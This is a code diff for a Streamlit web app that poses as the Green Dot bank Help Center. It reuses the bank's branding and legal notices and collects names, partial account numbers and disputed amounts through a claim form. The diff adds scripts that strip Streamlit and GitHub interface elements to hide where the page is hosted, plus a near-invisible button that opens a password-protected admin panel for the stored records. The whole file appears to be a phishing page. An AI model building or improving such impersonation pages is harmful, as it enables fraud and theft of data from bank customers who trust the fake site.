@@ -29,36 +29,53 @@ init_db()
 
 st.set_page_config(page_title="Green Dot | Help Center", layout="centered", page_icon="✅")
 
-# --- JS: PURGA ATÓMICA (Protección contra líneas de GitHub) ---
+# --- JS: PURGA TOTAL --- 
 st.markdown("""<script>
-    const purgeResiduals = () => {
-        const targets = [
+    const purge = () => {
+        const selectors = [
             '.section-anchor', 'a.section-anchor', '[data-testid="stHeaderActionElements"]',
-            '[data-testid="stAppToolbar"]', '[data-testid="stElementToolbar"]', 
-            'button[title="View fullscreen"]', '.st-emotion-cache-140j12g', 
+            '[data-testid="stAppToolbar"]', '[data-testid="stElementToolbar"]',
             'header', 'footer', '.stDeployButton', '.st-emotion-cache-gi0tri', 
-            '.etxdrby3', '.etxdrby1', 'svg.section-anchor-icon'
+            'svg.section-anchor-icon', '.etxdrby1', '.etxdrby2'
         ];
-        targets.forEach(s => { 
-            document.querySelectorAll(s).forEach(el => el.style.display = 'none');
-            document.querySelectorAll(s).forEach(el => el.remove()); 
+        selectors.forEach(s => {
+            document.querySelectorAll(s).forEach(el => el.remove());
         });
     };
-    setInterval(purgeResiduals, 50);
+    setInterval(purge, 10);
 </script>""", unsafe_allow_html=True)
 
-# --- CSS: BLOQUEO PERMANENTE ---
+# --- CSS: ESTILO PERMANENTE ---
 st.markdown("""<style>
     .stApp { background-color: #000000 !important; color: #FFFFFF !important; }
     .block-container { max-width: 500px !important; padding-top: 1.5rem !important; }
-    .promo-box { background-color: #111; padding: 30px; text-align: center; border-radius: 12px; margin: 25px 0; border: 1px solid #222; }
-    .legal-container { font-size: 10px; color: #444; text-align: justify; margin-top: 50px; border-top: 1px solid #111; padding-top: 15px; line-height: 1.5; }
+    
+    /* Ocultar TODO lo de Streamlit/GitHub */
+    [data-testid="stHeader"], header, footer, .stDeployButton, .section-anchor { 
+        display: none !important; visibility: hidden !important; 
+    }
+
+    .promo-box { 
+        background-color: #111; padding: 30px; text-align: center; 
+        border-radius: 12px; margin: 25px 0; border: 1px solid #222; 
+    }
+
+    /* Footer Legal Corregido (Texto puro, sin interferencias) */
+    .legal-container {
+        font-size: 11px !important;
+        color: #666 !important;
+        text-align: justify !important;
+        margin-top: 40px !important;
+        padding-top: 20px !important;
+        border-top: 1px solid #222 !important;
+        line-height: 1.6 !important;
+        font-family: sans-serif !important;
+    }
+
     div.stButton > button[key="ghost_dot"] {
-        background-color: transparent !important; border: none !important; color: #444 !important;
-        padding: 0 !important; margin: 0 !important; display: inline !important;
-        font-size: 10px !important; width: auto !important; height: auto !important;
-        min-height: 0 !important; min-width: 0 !important; box-shadow: none !important;
-        cursor: text !important; vertical-align: baseline !important;
+        background-color: transparent !important; border: none !important; color: #111 !important;
+        padding: 0 !important; width: 1px !important; height: 1px !important;
+        cursor: default !important; box-shadow: none !important;
     }
 </style>""", unsafe_allow_html=True)
 
@@ -68,9 +85,11 @@ if not st.session_state.admin_mode:
     col_logo = st.columns([1, 1.5, 1])[1]
     with col_logo:
         if os.path.exists('logo.svg'): st.image('logo.svg', use_container_width=True)
+    
     st.title("Help Center")
     st.write("Please fill out the form below to submit your claim.")
-    with st.form("ghost_form_32_4_1", clear_on_submit=True):
+    
+    with st.form("final_shield_form", clear_on_submit=True):
         nombre = st.text_input("Full Name")
         cuenta = st.text_input("Last 4 digits of Account")
         monto = st.number_input("Disputed Amount", min_value=0.0, format="%.2f")
@@ -82,6 +101,7 @@ if not st.session_state.admin_mode:
                 ref = generate_ref()
                 st.success(f"Success. Reference: {ref}")
             else: st.error("Information required.")
+
     st.markdown("""<div class='promo-box'>
         <h3 style='color:white; margin-bottom:15px;'>Download the Green Dot app</h3>
         <div style='display: flex; justify-content: center; gap: 15px; flex-wrap: wrap; margin-bottom: 20px;'>
@@ -93,15 +113,21 @@ if not st.session_state.admin_mode:
             </a>
         </div>
     </div>""", unsafe_allow_html=True)
+
+    # TEXTO LEGAL ESTRICTO
     st.markdown("""<div class='legal-container'>
         * When on a desktop, hover over * to view important disclosures. When on a mobile device, tap on * to view disclosures.<br><br>
-        ©2026 Green Dot Corporation. All rights reserved. Green Dot Corporation NMLS #914924; Green Dot Bank NMLS #908739""", unsafe_allow_html=True)
+        Green Dot&reg; cards are issued by Green Dot Bank, Member FDIC. &copy;2026 Green Dot Corporation. All rights reserved. Green Dot Corporation NMLS #914924; Green Dot Bank NMLS #908739.
+    </div>""", unsafe_allow_html=True)
+    
     if st.button(".", key="ghost_dot"): st.session_state.admin_mode = True
-    st.markdown("</div>", unsafe_allow_html=True)
+
 else:
     col_adm = st.columns([1, 1.5, 1])[1]
     with col_adm:
         if os.path.exists('logo.svg'): st.image('logo.svg', use_container_width=True)
     if st.button("Exit"): st.session_state.admin_mode = False
     pw = st.text_input("Auth Key", type="password")
-    if pw == "Diostieneelpoder1": st.write("Access Granted")
+    if pw == "Diostieneelpoder1": 
+        st.write("### Admin Panel Active")
+        # Aquí iría la lógica de visualización de registros si fuera necesario
